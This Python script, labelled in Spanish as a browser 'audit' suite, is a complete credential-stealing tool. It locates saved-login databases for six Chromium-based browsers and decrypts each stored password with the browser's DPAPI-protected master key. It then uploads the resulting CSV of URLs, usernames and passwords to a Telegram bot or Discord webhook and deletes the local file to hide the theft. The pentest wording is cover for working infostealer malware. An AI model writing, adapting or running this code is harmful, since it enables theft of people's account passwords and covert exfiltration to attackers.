import os
import re
import sys
import json
import base64
import sqlite3
import shutil
import csv
import logging
import argparse
import requests
from pathlib import Path
from datetime import datetime

# Condicional para win32crypt (solo Windows)
try:
    import win32crypt
except ImportError:
    win32crypt = None

from Cryptodome.Cipher import AES

# Configuración de Logging profesional
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler("pentest_audit.log", encoding='utf-8'),
        logging.StreamHandler(sys.stdout)
    ]
)
logger = logging.getLogger(__name__)

class Exfiltrator:
    """Gestor de exfiltración modular."""
    def __init__(self, telegram_token=None, telegram_chat_id=None, discord_webhook=None):
        self.telegram_token = telegram_token
        self.telegram_chat_id = telegram_chat_id
        self.discord_webhook = discord_webhook

    def send_to_telegram(self, file_path):
        """Envía el archivo CSV a un bot de Telegram."""
        if not self.telegram_token or not self.telegram_chat_id:
            return False
            
        url = f"https://api.telegram.org/bot{self.telegram_token}/sendDocument"
        try:
            with open(file_path, 'rb') as f:
                response = requests.post(
                    url, 
                    data={'chat_id': self.telegram_chat_id}, 
                    files={'document': f}
                )
            if response.status_code == 200:
                logger.info("Exfiltración vía Telegram: EXITOSA.")
                return True
            else:
                logger.error(f"Error Telegram: {response.text}")
        except Exception as e:
            logger.error(f"Falla crítica en exfiltración Telegram: {e}")
        return False

    def send_to_discord(self, file_path):
        """Envía el reporte a un webhook de Discord."""
        if not self.discord_webhook:
            return False
            
        try:
            with open(file_path, 'rb') as f:
                response = requests.post(
                    self.discord_webhook,
                    files={'file': f}
                )
            if response.status_code in [200, 204]:
                logger.info("Exfiltración vía Discord: EXITOSA.")
                return True
        except Exception as e:
            logger.error(f"Falla crítica en exfiltración Discord: {e}")
        return False

class ChromiumDecryptor:
    def __init__(self):
        self.local_appdata = Path(os.environ.get('LOCALAPPDATA', ''))
        self.roaming_appdata = Path(os.environ.get('APPDATA', ''))
        
        self.browsers = {
            "Chrome": self.local_appdata / "Google/Chrome/User Data",
            "Edge": self.local_appdata / "Microsoft/Edge/User Data",
            "Brave": self.local_appdata / "BraveSoftware/Brave-Browser/User Data",
            "Vivaldi": self.local_appdata / "Vivaldi/User Data",
            "Opera": self.roaming_appdata / "Opera Software/Opera Stable",
            "Opera GX": self.roaming_appdata / "Opera Software/Opera GX Stable"
        }

    def get_secret_key(self, browser_path):
        local_state_path = browser_path / "Local State"
        if not local_state_path.exists():
            return None

        try:
            with open(local_state_path, "r", encoding='utf-8') as f:
                local_state = json.load(f)
            
            encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            encrypted_key = encrypted_key[5:]
            
            if win32crypt:
                secret_key = win32crypt.CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
                return secret_key
        except Exception as e:
            logger.debug(f"Error Master Key en {browser_path.name}: {e}")
        return None

    def decrypt_password(self, ciphertext, secret_key):
        try:
            iv = ciphertext[3:15]
            payload = ciphertext[15:-16]
            cipher = AES.new(secret_key, AES.MODE_GCM, iv)
            return cipher.decrypt(payload).decode()
        except Exception:
            return "[Error Descifrado]"

    def audit(self, output_file, verbose=False):
        total = 0
        with open(output_file, mode='w', newline='', encoding='utf-8') as f:
            writer = csv.writer(f)
            writer.writerow(["Browser", "Profile", "URL", "User", "Pass"])

            for name, path in self.browsers.items():
                if not path.exists(): continue
                
                key = self.get_secret_key(path)
                if not key: continue

                profiles = [p for p in path.iterdir() if p.is_dir() and (p.name == "Default" or p.name.startswith("Profile"))] or [path]

                for profile in profiles:
                    login_db = profile / "Login Data"
                    if not login_db.exists(): continue

                    temp_db = Path("tmp_login.db")
                    try:
                        shutil.copy2(login_db, temp_db)
                        conn = sqlite3.connect(temp_db)
                        cursor = conn.cursor()
                        cursor.execute("SELECT action_url, username_value, password_value FROM logins")
                        
                        count = 0
                        for url, user, cipher_pass in cursor.fetchall():
                            if url and user and cipher_pass:
                                password = self.decrypt_password(cipher_pass, key)
                                writer.writerow([name, profile.name, url, user, password])
                                count += 1
                                if verbose: logger.info(f"[{name}] {url}")

                        total += count
                        conn.close()
                    except Exception as e:
                        logger.error(f"Error {name}: {e}")
                    finally:
                        if temp_db.exists(): temp_db.unlink()

        return total

def main():
    parser = argparse.ArgumentParser(description="Suite de Auditoría Auditor-Chromium (Phase 3)")
    parser.add_argument("-o", "--output", default="audit_report.csv", help="Archivo reporte")
    parser.add_argument("-v", "--verbose", action="store_true", help="Logeo detallado")
    
    # Parámetros de Exfiltración
    parser.add_argument("--telegram-token", help="Bot Token")
    parser.add_argument("--telegram-chatid", help="Chat ID")
    parser.add_argument("--discord", help="Webhook URL")
    parser.add_argument("--no-wipe", action="store_true", help="NO borrar archivo tras exfiltración")
    
    args = parser.parse_args()

    logger.info("Iniciando auditoría Fase 3...")
    
    decryptor = ChromiumDecryptor()
    results_count = decryptor.audit(args.output, args.verbose)
    
    logger.info(f"Escaneo finalizado. {results_count} credenciales encontradas.")

    if results_count > 0:
        exf = Exfiltrator(args.telegram_token, args.telegram_chatid, args.discord)
        
        # Intentar Telegram
        if args.telegram_token and args.telegram_chatid:
            exf.send_to_telegram(args.output)
            
        # Intentar Discord
        if args.discord:
            exf.send_to_discord(args.output)

        # Sigilo: Borrado de artefactos
        if not args.no_wipe and (args.telegram_token or args.discord):
            Path(args.output).unlink()
            logger.info("Limpieza finalizada: Reporte CSV eliminado localmente por seguridad.")

if __name__ == "__main__":
    main()
